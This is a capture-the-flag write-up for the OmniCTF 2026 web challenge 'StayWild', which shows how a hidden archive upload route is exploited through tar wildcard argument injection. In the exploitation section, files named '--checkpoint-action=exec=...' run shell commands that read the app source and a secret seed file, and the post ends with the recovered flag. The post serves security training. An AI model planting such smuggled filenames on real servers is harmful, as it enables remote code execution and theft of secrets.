---
title: "OmniCTF2026-web/StayWild"
description: "CTF writeup - web/StayWild (OmniCTF 2026)"
date: 2026-07-19
tags: [CTF, Web, OmniCTF]
category: "OmniCTF 2026"
cover: ./cover.png
pinned: false
draft: false
---

## Recon

The home page is a static Wildlife Archive site. The response always sets a cookie:

```http
Set-Cookie: role=visitor; Path=/; SameSite=Lax
```

`robots.txt` has no `Disallow`, but it has a hint:

```text
Field archive tooling is not ready for public indexing.
```

Fuzzing routes finds a hidden endpoint:

![](./image.png)

Opening `/staging` shows an archive upload form:

![](./image-1.png)

```text
Only .tar files are accepted at this stage.
```

## Creating the workspace

Upload a normal tar:

![](./image-2.png)

The workspace page shows the extraction log and leaks another route:

```html
<form action="/additional/1784486716375" method="POST" enctype="multipart/form-data">
```

The additional upload button is disabled client-side.

![](./image-3.png)

Disable the disabling:

```js
enableExperimentalIntake()
```

![](./image-4.png)

## Analyzing the bug

Upload again to:

```text
/additional/1784486716375
```

The uploaded file must be named:

```text
materials.tar
```

The additional route whitelists the upload filename, so the name in the multipart must be `materials.tar`. If a different filename is used it gets rejected.

Inside `materials.tar`:

```
.
|-- materials.tar
|   |-- --checkpoint=1
|   |-- --checkpoint-action=exec=id
|   `-- base
```

The contents of the files can be empty.

After uploading `materials.tar`, the server re-extracts it in the old workspace:

![](./image-5.png)

The log has errors:
- `tar: materials.tar: Not found in archive`
- `tar: seed.tar: Not found in archive`

The first payload upload just drops those filenames into the workspace.

Upload another `materials.tar` containing only `base` to trigger.

![](./image-6.png)

So RCE works.

## Exploitation

Use the bug to read the app source. Craft a payload to read `server.js`:

```
.
|-- materials.tar
|   |-- --checkpoint=1
|   |-- --checkpoint-action=exec=sh -c 'cd ..;cd ..;cd ..;cd ..;cd app;sed -n 1,150p server.js'
|   `-- base
```

![](./image-7.png)

Then upload another `materials.tar` to trigger:

```js
const SEED_FILE = process.env.SEED_FILE || "/opt/wild/.cache/seed-574";
```

![](./image-8.png)

Now that we know the seed path, create a new additional. Craft a payload to read the seed:

```
.
|-- materials.tar
|   |-- --checkpoint=1
|   |-- --checkpoint-action=exec=sh -c 'cd ..;cd ..;cd ..;cd ..;cd opt;cd wild;cd .cache;cat seed-574'
|   `-- base
```

Then upload a `materials.tar` to trigger. The log returns:

![](./image-9.png)

```text
b21uaUNURnt3MWxkYzRyZHNfY2FuX2czdF93MWxkfQ==
```

## Flag

```text
omniCTF{w1ldc4rds_can_g3t_w1ld}
```
